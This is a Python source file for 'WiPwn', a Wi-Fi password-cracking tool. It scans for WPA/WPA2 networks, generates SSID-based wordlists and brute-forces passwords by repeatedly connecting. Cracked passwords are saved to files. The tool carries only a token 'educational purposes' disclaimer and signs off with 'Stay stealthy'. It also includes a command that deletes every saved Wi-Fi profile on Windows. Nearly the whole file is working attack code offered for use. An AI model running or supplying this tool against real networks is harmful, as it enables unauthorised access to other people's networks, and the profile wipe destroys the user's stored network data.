import os
import time
import subprocess
import sys


def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])


required_packages = ['pyfiglet', 'termcolor', 'pywifi']
for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        print(f"Package '{package}' not found. Installing...")
        install_package(package)

# Now the rest of the code follows...
import pyfiglet
from termcolor import colored
from pywifi import PyWiFi, const, Profile
from concurrent.futures import ThreadPoolExecutor
import string
import itertools

# ─────────────────────────────────────────
# ░░░░░░░░░░░░░░░ [ UI ELEMENTS ] ░░░░░░░░░░░░░░░
# ─────────────────────────────────────────

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear_screen()
    ascii_banner = pyfiglet.figlet_format("WiPwn")
    print(colored(ascii_banner, "cyan"))
    print(colored("           Coded by NullSec8", "blue"))
    print(colored("   ⚠️  FOR EDUCATIONAL PURPOSES ONLY ⚠️", "red"))
    print(colored(" Use only on networks you own or have permission to test.\n", "red"))

# ─────────────────────────────────────────
# ░░░░░░░░░░░░░░░ [ NETWORK SCANNING ] ░░░░░░░░░░░░░░░
# ─────────────────────────────────────────

def scan_networks():
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(2)
    results = iface.scan_results()
    seen = set()
    networks = []
    for net in results:
        if net.ssid and net.ssid not in seen:
            seen.add(net.ssid)
            if const.AKM_TYPE_WPA2PSK in net.akm or const.AKM_TYPE_WPAPSK in net.akm:
                networks.append(net)
    return networks

def show_networks(networks):
    print(colored("[*] Networks found:", "yellow"))
    for i, net in enumerate(networks):
        channel = getattr(net, "channel", "N/A")
        akm_types = net.akm
        security = "WPA/WPA2" if const.AKM_TYPE_WPA2PSK in akm_types or const.AKM_TYPE_WPAPSK in akm_types else "OPEN"
        print(colored(f"[{i}] {net.ssid} - Channel: {channel}, Security: {security}", "green"))

# ─────────────────────────────────────────
# ░░░░░░░░░░░░░░░ [ LOGGING ] ░░░░░░░░░░░░░░░
# ─────────────────────────────────────────

def log_attempt(ssid, password, success):
    with open("bruteforce_log.txt", "a") as log:
        status = "SUCCESS" if success else "FAIL"
        log.write(f"[{status}] SSID: {ssid} | Password: {password}\n")

# ─────────────────────────────────────────
# ░░░░░░░░░░░░░░░ [ CONNECTION & BRUTEFORCE ] ░░░░░░░░░░░░░░░
# ─────────────────────────────────────────

def attempt_connection(iface, ssid, password):
    print(colored(f"[*] Trying password: {password}", "yellow"))

    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.disconnect()
    time.sleep(1)
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)

    success = False
    for i in range(1):  
        time.sleep(1)
        status = iface.status()
        if status == const.IFACE_CONNECTED:
            success = True
            break

    iface.disconnect()
    iface.remove_all_network_profiles()
    log_attempt(ssid, password, success)
    return success

def bruteforce_all_combinations(ssid, starting_point):
    characters = string.ascii_letters + string.digits
    max_length = 8

    wifi = PyWiFi()
    iface = wifi.interfaces()[0]

    print(colored(f"[*] Starting brute-force on '{ssid}' with all combinations from '{starting_point}'", "cyan"))

    for pwd_length in range(1, max_length + 1):
        for pwd in itertools.product(characters, repeat=pwd_length):
            password = starting_point + ''.join(pwd)
            if attempt_connection(iface, ssid, password):
                print(colored(f"[+] Success! Password found: {password}", "green"))
                with open("cracked_wifi.txt", "w") as out:
                    out.write(f"SSID: {ssid}\nPassword: {password}\n")
                os._exit(0)

    print(colored("[!] Brute-force finished. Password not found.", "red"))

def bruteforce_parallel(ssid, wordlist_path):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]

    if not os.path.exists(wordlist_path):
        print(colored(f"[-] Wordlist file '{wordlist_path}' not found.", "red"))
        return

    with open(wordlist_path, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(colored(f"[*] Starting parallel brute-force on '{ssid}' with {len(passwords)} passwords", "cyan"))

    def worker(password):
        if attempt_connection(iface, ssid, password):
            print(colored(f"[+] Password FOUND: {password}", "green"))
            with open("cracked_wifi.txt", "w") as out:
                out.write(f"SSID: {ssid}\nPassword: {password}\n")
            os._exit(0)


    for password in passwords:
        if worker(password):
            break

    print(colored("[!] Brute-force finished. No valid password found.", "red"))

# ─────────────────────────────────────────
# ░░░░░░░░░░░░░░░ [ WORDLIST GENERATOR ] ░░░░░░░░░░░░░░░
# ─────────────────────────────────────────

def generate_wordlist(ssid):
    print(colored(f"[*] Generating an advanced wordlist for SSID: {ssid}", "yellow"))

    common_suffixes = ["123", "1234", "12345", "2024", "2025", "admin", "password", "qwerty", "welcome", "sunshine", "football", "iloveyou"]
    common_prefixes = ["123", "admin", "letmein", "password", "qwerty", "abc"]
    special_chars = ["!", "@", "#", "$", "%", "&", "_", "+"]

    base_words = [ssid, ssid.lower(), ssid.upper(), ssid.capitalize()]
    wordlist = set(base_words)

    for word in base_words:
        for suffix in common_suffixes:
            wordlist.add(word + suffix)
            wordlist.add(suffix + word)
        for prefix in common_prefixes:
            wordlist.add(prefix + word)
            wordlist.add(word + prefix)
        for special in special_chars:
            wordlist.add(word + special)
            wordlist.add(special + word)

    for word in base_words:
        wordlist.add(word + "123")
        wordlist.add(word + "2024")
        wordlist.add(word + "!")

    filename = f"{ssid}_wordlist.txt"
    with open(filename, "w") as f:
        for word in sorted(wordlist):
            f.write(word + "\n")

    print(colored(f"[+] Wordlist saved as: {filename}\n", "green"))

# ─────────────────────────────────────────
# ░░░░░░░░░░░░░░░ [ MENU LOGIC ] ░░░░░░░░░░░░░░░
# ─────────────────────────────────────────

def clear_saved_wifi_profiles():
    if os.name == "nt":
        print(colored("[*] Clearing all saved WiFi profiles (Windows)...", "yellow"))
        os.system("netsh wlan delete profile name=* >nul")
        print(colored("[+] All WiFi profiles deleted successfully!", "green"))
    else:
        print(colored("[*] Clearing using PyWiFi (non-Windows systems)...", "yellow"))
        wifi = PyWiFi()
        iface = wifi.interfaces()[0]
        iface.remove_all_network_profiles()
        print(colored("[+] All WiFi profiles removed from interface (if supported)", "green"))

def interactive_menu():
    while True:
        print(colored("\n[1] Scan for networks", "yellow"))
        print(colored("[2] Bruteforce a network with wordlist", "yellow"))
        print(colored("[3] Generate wordlist for target", "yellow"))
        print(colored("[4] Bruteforce without wordlist (try all combinations)", "yellow"))
        print(colored("[5] Clear saved WiFi profiles", "yellow"))
        print(colored("[6] Exit", "yellow"))

        try:
            choice = int(input(colored(">> Select an option: ", "blue")))
        except ValueError:
            print(colored("[-] Invalid input. Use numbers.", "red"))
            continue

        if choice == 1:
            networks = scan_networks()
            show_networks(networks)
            time.sleep(1)  
        elif choice == 2:
            ssid = input(">> Enter the SSID of the network: ")
            wordlist_path = input(">> Enter the name of the wordlist file (in the same folder): ")
            if not os.path.exists(wordlist_path):
                print(colored("[-] Wordlist file not found!", "red"))
                continue
            bruteforce_parallel(ssid, wordlist_path)
        elif choice == 3:
            ssid = input(">> Enter SSID name to generate wordlist: ")
            generate_wordlist(ssid)
        elif choice == 4:
            ssid = input(">> Enter SSID name for brute-force attack: ")
            starting_point = input(">> Enter starting point for brute-force (optional): ")
            bruteforce_all_combinations(ssid, starting_point)
        elif choice == 5:
            clear_saved_wifi_profiles()
        elif choice == 6:
            print(colored("\n[*] Exiting... Stay stealthy 🕶️\n", "cyan"))
            break
        else:
            print(colored("[-] Invalid option.", "red"))

# ─────────────────────────────────────────
# ░░░░░░░░░░░░░░░ [ MAIN ENTRY ] ░░░░░░░░░░░░░░░
# ─────────────────────────────────────────

def main():
    banner()
    interactive_menu()

if __name__ == "__main__":
    main()
